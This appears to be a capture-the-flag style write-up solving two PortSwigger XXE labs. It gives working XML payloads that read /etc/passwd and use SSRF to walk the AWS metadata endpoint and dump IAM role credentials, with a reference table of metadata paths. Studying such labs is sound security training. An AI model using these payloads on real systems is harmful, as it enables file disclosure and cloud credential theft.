## Labs Covered

This write-up focuses on the following **APPRENTICE-level labs** from the PortSwigger Web Security Academy related to **XML External Entity (XXE) Injection**:

**Exploiting XXE using external entities to retrieve files**  
This lab demonstrates how attackers can exploit XXE vulnerabilities to read sensitive files from the server.

**Exploiting XXE to perform SSRF attacks**  
This lab shows how XXE vulnerabilities can be leveraged to perform server-side request forgery (SSRF) attacks.

---

### LAB 1 - Exploiting XXE using external entities to retrieve files

### Lab Description

![image](https://github.com/user-attachments/assets/d14bffc5-52ee-4c19-a1e1-d35e92287e6a)

### Solution


### 🔍 1. Intercept the Request
Use **Burp Suite** to intercept the **Check Stock** request.

You’ll see a POST request like this:

```http
POST /product/stock HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
````

---

### 🛠️ 2. Modify XML to Inject XXE

Add the `DOCTYPE` definition between the XML declaration and the root `stockCheck` element. Replace the `productId` value with `&xxe;`.

### 💣 XXE Payload to Read `/etc/passwd`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

![image](https://github.com/user-attachments/assets/75802045-6bd0-4eef-90d2-e09b359c76ee)


---

### 🚀 3. Send the Request

* Forward the modified request.
* Observe the response: it should now include the contents of `/etc/passwd`.

![image](https://github.com/user-attachments/assets/9e92adff-5e6a-418c-affe-9de44544f615)



Once the `/etc/passwd` file is reflected back in the response, the lab is marked as **solved**.

![image](https://github.com/user-attachments/assets/a51194c3-2138-4c3e-9ef9-f866b4a24b7e)

# Key takeaway:

![image](https://github.com/user-attachments/assets/63c1396e-fe25-4e11-9854-b577f654be8f)

![image](https://github.com/user-attachments/assets/d58e23d1-73df-44b2-b8c6-3093b2949126)

---

### LAB 2 - Exploiting XXE to perform SSRF attacks


### Lab Description


![image](https://github.com/user-attachments/assets/89d7fd94-6235-4924-8b05-7f6a145c8e07)

### Solution


## 🧠 Background

### 🧾 Local Entities
Typical files like `/etc/passwd` are local entities. These can reveal OS-level information.

### ☁️ AWS Metadata Service
Cloud services like AWS expose metadata via a special internal endpoint:
```

http://169.254.169.254

````

This can be used to:
- Enumerate instance information
- Extract IAM role credentials

---


### 🔹 1. Initial Discovery Payload

Send a simple XXE payload to access the root of the AWS metadata endpoint:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
````


**Expected Output:**
You’ll likely see `latest` returned after "Invalid product".

![image](https://github.com/user-attachments/assets/a39cfc0a-36ef-4e1e-b31b-12035366d42a)


## 🔍 Enumerating the AWS Metadata Paths

From the initial XXE payload targeting `http://169.254.169.254/`, you receive the string `latest`, indicating that the server is forwarding the request to the **AWS instance metadata service**.

This is your first clue.

Now continue exploring the metadata hierarchy:

### 🔹 2. Walk the Metadata API


Start traversing the metadata directory structure with each of the following payloads:

1. **Get the root metadata version**

```xml

   <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/">

   ````

> Response: `meta-data`

2. **List metadata categories**

   ```xml
   <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
   ````

   > Response (partial example):

   ```
   ami-id
   hostname
   iam/
   instance-id
   ...
   ```

3. **Explore IAM-specific data**

   ```xml
   <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/">
   ```

   > Response:

   ```
   security-credentials/
   ```

4. **List available IAM roles**

   ```xml
   <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
   ```

   > Response:

   ```
   admin
   ```
---

### 🔹 3. Final Exploit – Dump Credentials

Replace the XXE entity to point directly to the role path:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```


 ![image](https://github.com/user-attachments/assets/5340c01b-62e4-4427-8ddd-5ce0e06561fe)

**Response:**

 ![image](https://github.com/user-attachments/assets/db89cc4c-01c0-4d7c-9e32-c40eec364d03)



Once you retrieve and view the AWS credentials from the metadata API, the lab will mark as solved.

![image](https://github.com/user-attachments/assets/533db340-2e19-48ad-91db-167933d7e467)

---

## 🧠 Bonus: Metadata Path Reference

| Endpoint                           | Description                              |
| ---------------------------------- | ---------------------------------------- |
| `/latest/meta-data/`               | Root metadata directory                  |
| `/instance-id`                     | EC2 instance ID                          |
| `/hostname`                        | Hostname                                 |
| `/iam/security-credentials/`       | IAM roles                                |
| `/iam/security-credentials/<role>` | IAM keys (Access Key, Secret Key, Token) |

---

KeyTakeaway:

![image](https://github.com/user-attachments/assets/5850d7d0-927a-4b5e-83f7-278ad3dea9ac)


